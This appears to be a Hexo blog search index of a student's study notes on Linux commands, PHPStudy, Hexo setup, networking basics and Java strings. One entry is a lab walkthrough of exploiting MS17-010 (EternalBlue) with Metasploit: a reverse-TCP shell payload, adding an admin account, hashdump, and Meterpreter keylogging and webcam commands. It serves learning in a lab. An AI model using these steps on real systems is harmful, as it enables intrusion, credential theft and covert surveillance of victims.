class="code"><pre><span class="line">ctrl+l        //清屏，往上翻可以查看历史操作</span><br></pre></td></tr></table></figure><h6 id="远程主机"><a href="#远程主机" class="headerlink" title="远程主机"></a>远程主机</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh IP       //远程主机，需要输入用户名和密码</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/m0_46422300/article/details/104645072">学习链接：Linux 常用操作命令大全_linux常用命令-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 1 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>笔记3</title>
      <link href="/2023/11/14/%E7%AC%94%E8%AE%B03/"/>
      <url>/2023/11/14/%E7%AC%94%E8%AE%B03/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP学习与搭建网站"><a href="#PHP学习与搭建网站" class="headerlink" title="PHP学习与搭建网站"></a>PHP学习与搭建网站</h1><ol><li><h3 id="安装PHPstudy"><a href="#安装PHPstudy" class="headerlink" title="安装PHPstudy"></a>安装PHPstudy</h3></li><li><h3 id="配置PHPstudy"><a href="#配置PHPstudy" class="headerlink" title="配置PHPstudy"></a>配置PHPstudy</h3><ol><li>点击启动Apache、Mysql</li><li>更改php版本</li><li>打开根目录，清楚www文件下所有文件</li><li>点击软件管理，下载SQL_Front5.3，完成后点开管理</li><li>配置数据库</li></ol></li><li><h3 id="在www文件目录下编写php文件"><a href="#在www文件目录下编写php文件" class="headerlink" title="在www文件目录下编写php文件"></a>在www文件目录下编写php文件</h3><p>（暂无，win10虚拟机无法打开）</p></li><li><h3 id="运行php文件"><a href="#运行php文件" class="headerlink" title="运行php文件"></a>运行php文件</h3></li><li><h3 id="安装Yakit"><a href="#安装Yakit" class="headerlink" title="安装Yakit"></a>安装Yakit</h3></li></ol>]]></content>
      
      
      <categories>
          
          <category> 1 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>笔记2</title>
      <link href="/2023/11/12/%E7%AC%94%E8%AE%B02/"/>
      <url>/2023/11/12/%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h1 id="博客主题的更换"><a href="#博客主题的更换" class="headerlink" title="博客主题的更换"></a>博客主题的更换</h1><ol><li><p>选择自己喜欢的主题</p><p>主题：butterfly</p></li><li><p>将主题加载在博客的themes下</p><p><a href="https://github.com/jerryc127/hexo-theme-butterfly">butterfly</a></p><p>修改根目录下的_config.yml文件：themes: butterfly</p><p>installation:  1. git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;butterfly(克隆)</p><ol start="2"><li>npm i hexo-theme-butterfly</li><li>npm install hexo-renderer-pug hexo-renderer-stylus</li></ol></li><li><p>主题的渲染</p><p><a href="https://blog.csdn.net/mjh1667002013/article/details/129290903">[Hexo]Hexo搭建Butterfly主题并快速美化_hexo主题_CoolTiger、的博客-CSDN博客</a></p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/elegege/images@main//image9.jpg" alt="主要的图片"></p><h1 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h1><ol><li><p>安装虚拟机</p></li><li><p>虚拟机wiin7系统</p></li><li><p>获取IP地址（Kali：ifconfig \Windows7：IPconfig)</p></li><li><p>虚拟机网络配置（桥接模式）</p></li><li><p>利用MS17_010漏洞渗透目标主机</p><ol><li><p>msf console</p></li><li><p>search ms17_010</p></li><li><p>use 3</p></li><li><p>set rhosts 192.168.0.32     run    (扫描192.168.0.32是否存在漏洞)</p></li><li><p>search ms17_010</p></li><li><p>use 0(exploit)</p></li><li><p>set rhosts 192.168.0.32（设置目标主机）</p></li><li><p>set lhost 192.168.0.62(虚拟机的IP)</p></li><li><p>set paload windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp(攻击荷载)</p></li><li><p>show options(查看配置)</p></li><li><p>exploit\run</p></li><li><p>win表示成功</p></li><li><p>sysinfo（显示主机系统信息）</p></li><li><p>chcp 65001(转换编码)</p></li><li><p>shell</p></li><li><p>whoami</p></li><li><p>net user admin admin &#x2F;add(创建admin账户)</p></li><li><p>net user</p></li><li><p>getuid(查看拿到的用户权限)</p></li><li><p>migrate [PID]（2308   进程迁移获得Adminstrator权限）</p></li><li><p>upload &#x2F;img&#x2F;kali&#x2F;L.jpg 上传图片</p></li><li><p>download 路径(下载文件)</p></li><li><p>run vnc 获取靶机桌面（无法控制靶机桌面）Metasploit利用vnc图形化远程控制工具获得靶机远程控制桌面</p></li><li><p>run hashdump (利用hashdump获取用户信息和密码)</p></li><li><p><code>run windows/gather/smart_hashdump </code>命令的使用需要系统权限。该功能更强大，如果当前用户是域管理员用户，则可以导出域内所有用户的hash</p></li><li><p>利用CMD5<a href="https://www.cmd5.com/default.aspx">md5在线解密破解,md5解密加密 (cmd5.com)</a></p></li><li><blockquote><p><strong><code>cmd指令:</code></strong><br>cat 读取文件内容到屏幕<br>cd 更改目录<br>checksum 检索文件的校验和<br>cp 将源复制到目标<br>del 删除指定文件<br>dir 列出文件（ls 的别名）<br>下载 下载文件或目录<br>编辑 编辑文件<br>getlwd 打印本地工作目录<br>getwd 打印工作目录<br>lcd 更改本地工作目录<br>lls 列出本地文件<br>lpwd 打印本地工作目录<br>ls 列出文件<br>mkdir 创建目录<br>mv 将源移动到目标<br>pwd 打印工作目录<br>rm 删除指定文件<br>rmdir 删除目录<br>search 搜索文件<br>show_mount 列出所有挂载点&#x2F;逻辑驱动器<br>upload 上传文件或目录<br>pkill 按名称终止进程</p></blockquote><blockquote><p><strong><code>meterpreter命令：</code></strong><br>keyscan_start 开始捕获击键（开始键盘记录）<br>keyscan_dump 转储按键缓冲（下载键盘记录）<br>keyscan_stop 停止捕获击键（停止键盘记录）<br>record_mic X秒从默认的麦克风record_mic音频记录（音频录制）<br>webcam_chat 开始视频聊天（视频，对方会有弹窗）<br>webcam_list 单摄像头（查看摄像头列表）<br>webcam_snap 采取快照从指定的摄像头（摄像头拍摄一张照片）<br>webcam_stream 播放视频流从指定的摄像头（开启摄像头监控）<br>enumdesktops 列出所有可访问的桌面和窗口站（窗体列表）<br>getdesktop 得到当前的Meterpreter桌面<br>reboot 重新启动远程计算机<br>shutdown 关闭远程计算机<br>shell 放入系统命令 shell<br>enumdesktops 列出所有可访问的桌面和窗口站<br>getdesktop 获取当前的meterpreter桌面<br>idletime 返回远程用户空闲的秒数<br>keyboard_send 发送击键<br>keyevent 发送按键事件<br>keyscan_dump 转储击键缓冲区<br>keyscan_start 开始捕获击键<br>keyscan_stop 停止捕获击键<br>mouse 发送鼠标事件<br>screenshare 实时观看远程用户桌面<br>screenshot 抓取交互式桌面的屏幕截图<br>setdesktop 更改 Meterpreters 当前桌面<br>uictl 控制一些用户界面组件<br>record_mic 从默认麦克风录制音频 X 秒<br>webcam_chat 开始视频聊天<br>webcam_list 列出网络摄像头<br>webcam_snap 从指定的网络摄像头拍摄快照<br>webcam_stream 播放来自指定网络摄像头的视频流<br>play 在目标系统上播放波形音频文件 (.wav)<br>getsystem 尝试将您的权限提升到本地系统的权限<br>execute -f notepad 打开记事本</p></blockquote></li></ol></li></ol><p>笔记到此就结束啦，感谢看到这里的各位！[^脚注]</p>]]></content>
      
      
      <categories>
          
          <category> 1 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/11/10/githubstudy/"/>
      <url>/2023/11/10/githubstudy/</url>
      
        <content type="html"><![CDATA[<h1 id="今天也是美好的一天呀"><a href="#今天也是美好的一天呀" class="headerlink" title="今天也是美好的一天呀"></a>今天也是美好的一天呀</h1><hr><h3 id="乌蒙山连着山外山"><a href="#乌蒙山连着山外山" class="headerlink" title="乌蒙山连着山外山"></a>乌蒙山连着山外山</h3><h3 id="月光洒在了响水滩"><a href="#月光洒在了响水滩" class="headerlink" title="月光洒在了响水滩"></a>月光洒在了响水滩</h3><h3 id="有没有人能够告诉我"><a href="#有没有人能够告诉我" class="headerlink" title="有没有人能够告诉我"></a>有没有人能够告诉我</h3><h3 id="是苍天对你在呼唤"><a href="#是苍天对你在呼唤" class="headerlink" title="是苍天对你在呼唤"></a>是苍天对你在呼唤</h3><h3 id="一座山连着一条河"><a href="#一座山连着一条河" class="headerlink" title="一座山连着一条河"></a>一座山连着一条河</h3><h3 id="哈哈哈哈哈哈"><a href="#哈哈哈哈哈哈" class="headerlink" title="哈哈哈哈哈哈"></a><em>哈哈哈哈哈哈</em></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">print(&quot;hello,world!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>1</th><th align="left">2</th></tr></thead><tbody><tr><td>日期</td><td align="left">心情</td></tr><tr><td>11.01</td><td align="left">一</td></tr><tr><td>11.02</td><td align="left">……</td></tr><tr><td>11.03</td><td align="left">&amp;</td></tr><tr><td>11.04</td><td align="left">*</td></tr><tr><td>11.05</td><td align="left">#</td></tr><tr><td>11.06</td><td align="left">@</td></tr><tr><td>11.07</td><td align="left">!</td></tr></tbody></table><p><a href="https://elegege.github.io/">hexo博客</a></p><p><img src="C:%5CUsers%5C27436%5COneDrive%5C%E5%9B%BE%E7%89%87%5C%E6%9C%AC%E6%9C%BA%E7%85%A7%E7%89%87%5C1.jpg" alt="图片"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/11/10/hello-world/"/>
      <url>/2023/11/10/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>biji</title>
      <link href="/2023/11/08/biji/"/>
      <url>/2023/11/08/biji/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h1><p>访问端口号</p><p>ipconfig</p><p>ping  测试网络连通性</p><ol><li><p>请求超时</p></li><li><p>连通性良好</p><h4 id="更换网络适配器的连接模式"><a href="#更换网络适配器的连接模式" class="headerlink" title="更换网络适配器的连接模式"></a>更换网络适配器的连接模式</h4><p>桥接模式</p><p>nat模式</p><p>主机模式</p></li></ol><h1 id="拓扑结构"><a href="#拓扑结构" class="headerlink" title="拓扑结构"></a>拓扑结构</h1><p>常见的网络拓扑结构有以下6种：</p><ol><li><p>总线型网络拓扑结构；</p></li><li><p>星型网络拓扑结构；</p></li><li><p>环形网络拓扑结构；</p></li><li><p>树型网络拓扑结构；</p></li><li><p>网状网络拓扑结构；</p></li><li><p>混合网络型拓扑结构。</p></li></ol><p>其中，“总线型网络拓扑结构”是所有设备连接到一条连接介质上，由一条高速公用总线连接若干个节点所形成的网络。</p><h4 id="三层结构模型：接入层、汇聚层、核心层"><a href="#三层结构模型：接入层、汇聚层、核心层" class="headerlink" title="三层结构模型：接入层、汇聚层、核心层"></a>三层结构模型：接入层、汇聚层、核心层</h4><p>接入层：无线网络发射器，AP（提供接入网络的接口）</p><p>汇聚层：楼层交换机、建筑物交换机（汇聚接入层设备）</p><p>核心层：核心交换机（数据高速转发）</p><h1 id="网络适配器的三种连接模式"><a href="#网络适配器的三种连接模式" class="headerlink" title="网络适配器的三种连接模式"></a>网络适配器的三种连接模式</h1><ol><li><p>桥接模式</p></li><li><p>nat模式</p></li><li><p>主机模式</p><ol><li><p>桥接模式:虚拟机和物理网络共享同一个网络地址，就像是连接到同一个交换机上。虚拟机可以直接访问网络中的其他设备，其他设备也可以直接访问虚拟机。</p></li><li><p>NAT模式:虚拟机使用虚拟网络地址，由主机充当网络地址转换器，将虚拟机的网络数据包转换为物理网络数据包。虚拟机可以访问外部网络，但外部网络无法直接访问虚拟机。</p></li><li><p>仅主机模式:虚拟机只能与主机进行通信，无法与外部网络通信。这种模式主要用于虚拟机的隔离测试和安全实验。</p><p><img src="https://cdn.jsdelivr.net/gh/elegege/images@main//imageqj.png" alt="桥接模式"></p><p><img src="https://cdn.jsdelivr.net/gh/elegege/images@main//imagenat.png" alt="NAT模式"></p><p><img src="https://cdn.jsdelivr.net/gh/elegege/images@main//imagezhuji.png" alt="主机模式"></p></li></ol></li><li><h1 id="虚拟机环境的搭建"><a href="#虚拟机环境的搭建" class="headerlink" title="虚拟机环境的搭建"></a>虚拟机环境的搭建</h1><ol><li><p>Kali的安装</p></li><li><p>网络镜像</p></li><li><p>虚拟机的运行</p><h3 id="博客的搭建"><a href="#博客的搭建" class="headerlink" title="博客的搭建"></a>博客的搭建</h3><h4 id="准备前提"><a href="#准备前提" class="headerlink" title="准备前提"></a>准备前提</h4><p>1.提前安装好(node.js)[<a href="https://nodejs.org/en]">https://nodejs.org/en]</a> 左边的那个<br>2.提前安装好(GIt)[<a href="https://git-scm.com/downloads]">https://git-scm.com/downloads]</a><br>3.提前注册好一个github账号（）<br>4.如果文章图片没有显示，请自行挂代理</p></li></ol><p>选择文件 git bash here</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><h4 id="配置ssh"><a href="#配置ssh" class="headerlink" title="配置ssh"></a>配置ssh</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh #检查本机已存在的ssh密钥</span><br></pre></td></tr></table></figure><p>如果提示：No such file or directory 说明你是第一次使用git。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C “邮件地址”</span><br></pre></td></tr></table></figure></li></ol><h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><h3 id="安装GIT"><a href="#安装GIT" class="headerlink" title="安装GIT"></a>安装GIT</h3><h3 id="新建文件夹boke"><a href="#新建文件夹boke" class="headerlink" title="新建文件夹boke"></a>新建文件夹boke</h3><p>git bash here</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo init blog</span><br><span class="line">cd blog</span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hexo new &quot;biji&quot;</span><br><span class="line">新建的网页模块</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">完成后可以通过本机IP地址：4000预览页面</span><br></pre></td></tr></table></figure><h4 id="配置ssh-1"><a href="#配置ssh-1" class="headerlink" title="配置ssh"></a>配置ssh</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh #检查本机已存在的ssh密钥</span><br></pre></td></tr></table></figure><p>如果提示：No such file or directory 说明你是第一次使用git。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C “邮件地址”</span><br></pre></td></tr></table></figure><p>生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：</p><p>SHA256:Df+Wq+puv9KPLkYgyy+9T3gaRlSi9ogu9lU2CT1vtjw</p><h4 id="上传代码"><a href="#上传代码" class="headerlink" title="上传代码"></a>上传代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;biji&quot;</span><br><span class="line">hexo g -d</span><br></pre></td></tr></table></figure><p><a href="https://elegege.github.io/">hexo运行</a></p><h4 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h4><p>安装  picgo</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>study</title>
      <link href="/2023/11/08/study/"/>
      <url>/2023/11/08/study/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="1-开始"><a href="#1-开始" class="headerlink" title="1. 开始"></a>1. 开始</h3><p>&#x3D;&#x3D;请注意我要开始装13了&#x3D;&#x3D;</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;hnhbBVC!@#$%12568()&lt;&gt;?&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//截取字符串前5位</span></span><br><span class="line">        String substring1= str.substring(<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//截掉字符串前5位</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">substring2</span> <span class="operator">=</span> str.substring(<span class="number">5</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//截取字符串后5位</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">substring3</span> <span class="operator">=</span> str.substring(str.length()-<span class="number">5</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">substring4</span> <span class="operator">=</span> str.substring(str.length()-<span class="number">5</span>,str.length());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//截掉字符串后5位</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">substring5</span> <span class="operator">=</span> str.substring(<span class="number">0</span>,str.length()-<span class="number">5</span>);</span><br><span class="line">        </span><br><span class="line">         <span class="comment">//截去字符串从第6位到第9位的字符串(从0 开始)</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">substring6</span> <span class="operator">=</span> str.substring(<span class="number">6</span>,<span class="number">10</span>);</span><br><span class="line">       </span><br><span class="line"><span class="comment">//将字符串hnh替换成abc</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">string6</span> <span class="operator">=</span>str.replace(<span class="string">&quot;hnh&quot;</span>,<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//从开始截取到指定字符5 (该字符出现的第一次)</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">midChar</span> <span class="operator">=</span> <span class="string">&quot;5&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">substring7</span> <span class="operator">=</span> str.substring(<span class="number">0</span>,str.indexOf(midChar)+ midChar.length());</span><br><span class="line">        </span><br><span class="line"><span class="comment">//从开始截取到指定字符串BVC</span></span><br><span class="line"><span class="type">String</span> <span class="variable">midStr</span> <span class="operator">=</span><span class="string">&quot;BVC&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">substring8</span> <span class="operator">=</span> str.substring(<span class="number">0</span>,str.indexOf(midStr )+midStr.length());</span><br><span class="line">        </span><br><span class="line">        System.out.println(substring1);</span><br><span class="line">        System.out.println(substring2);</span><br><span class="line">        System.out.println(substring3);</span><br><span class="line">        System.out.println(substring4);</span><br><span class="line">        System.out.println(substring5);</span><br><span class="line">        System.out.println(substring6);</span><br><span class="line">        System.out.println(string6);</span><br><span class="line">        System.out.println(substring7);</span><br><span class="line">        System.out.println(substring8);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$$<br>$\lim_{x\to\infty}\exp(-x)&#x3D;0$\<br>x&#x3D;1\<br>y&#x3D;3\<br>z&#x3D;x+y<br>$$<br>2H<del>2</del>O<del>2</del> &#x3D;&#x3D;&#x3D;2H<del>2</del>O + O<del>2</del></p><p>bbbbbbbbbbbbbb<br/>hhhhhhhhhhhhhh<br/><strong>hello</strong></p><table><thead><tr><th align="center">星期</th><th align="center">知识点</th><th align="center">语言</th></tr></thead><tbody><tr><td align="center">一</td><td align="center">arraylist</td><td align="center">java</td></tr><tr><td align="center">二</td><td align="center">数据结构–树</td><td align="center">C</td></tr><tr><td align="center">三</td><td align="center">表单验证</td><td align="center">JavaScrpt</td></tr><tr><td align="center">四</td><td align="center">HashMap</td><td align="center">Java</td></tr><tr><td align="center">五</td><td align="center">MYSQL</td><td align="center">SQL</td></tr></tbody></table><p><em><u>当山峰没有棱角的时候，当河水不再流</u></em></p><p>:smile_cat::athletic_shoe:</p><hr><p>&lt;<a href="http://www.baidu.com>">www.baidu.com&gt;</a></p><ol><li><p>第一天</p></li><li><p>第二天</p></li></ol><h3 id="2-结束"><a href="#2-结束" class="headerlink" title="2. 结束"></a>2. 结束</h3><p><img src="https://cdn.jsdelivr.net/gh/elegege/images@main//imageL.jpg" alt="image"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>githubstudy</title>
      <link href="/2023/11/08/githubstudy-1/"/>
      <url>/2023/11/08/githubstudy-1/</url>
      
        <content type="html"><![CDATA[<h1 id="实习周记"><a href="#实习周记" class="headerlink" title="实习周记"></a>实习周记</h1><p>   11月7日          天气：晴</p><p>​今天在学习了虚拟机环境的搭建，以及个人博客的搭建。</p><table><thead><tr><th>日期</th><th>心情</th></tr></thead><tbody><tr><td>11.07</td><td>-</td></tr><tr><td>11.08</td><td>……</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.*</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(string[] args)</span>&#123;</span><br><span class="line">    System.out.printf(<span class="string">&quot;hello,world!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://elegege.github.io/">hexo myboke</a></p><p><img src="https://cdn.jsdelivr.net/gh/elegege/images@main//image4.jpg" alt="图片"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>haiboke</title>
      <link href="/2023/11/07/haiboke/"/>
      <url>/2023/11/07/haiboke/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
